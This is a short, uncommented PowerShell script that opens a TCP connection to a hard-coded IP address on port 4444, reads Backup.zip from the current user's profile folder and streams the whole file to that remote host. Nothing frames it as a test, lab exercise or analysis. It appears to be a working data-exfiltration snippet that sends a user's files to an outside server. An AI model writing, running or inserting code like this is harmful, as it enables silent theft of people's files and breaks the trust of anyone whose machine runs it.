$server = "104.181.176.13"
$port = 4444
$filePath = "C:\Users\$env:USERNAME\Backup.zip"

$client = New-Object System.Net.Sockets.TcpClient($server, $port)
$stream = $client.GetStream()
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$stream.Write($fileBytes, 0, $fileBytes.Length)
$stream.Close()
$client.Close()
